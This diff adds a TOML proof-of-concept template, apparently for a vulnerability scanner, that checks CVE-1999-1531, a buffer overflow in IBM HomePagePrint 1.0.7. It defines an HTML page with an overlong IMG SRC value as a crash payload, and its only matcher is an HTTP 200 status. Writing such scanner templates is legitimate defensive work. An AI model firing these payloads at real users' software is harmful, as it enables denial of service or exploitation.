@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 IBM HomePagePrint 1.0.7 for Windows98J 在处理 HTML IMG 标签 SRC 属性时是否存在缓冲区溢出。通过向受害者构造包含超长 IMG_SRC 属性值的恶意网页，观察目标渲染进程是否崩溃或异常，以确认漏洞存在。本 PoC 仅做安全无损验证，不执行实际任意代码利用。"
+id = "POC-AVE-1999-1985"
+name = "CVE-1999-1531 IBM HomePagePrint IMG_SRC 缓冲区溢出 PoC"
+severity = "high"
+tags = ["ave-1999-1985"]
+vuln_id = [
+    "CVE-1999-1531",
+    "AVE-1999-1985",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc_1531.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '<HTML><BODY><IMG SRC="AAAA(超长字符串,长度约4096以上)AAAA"></BODY></HTML>'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
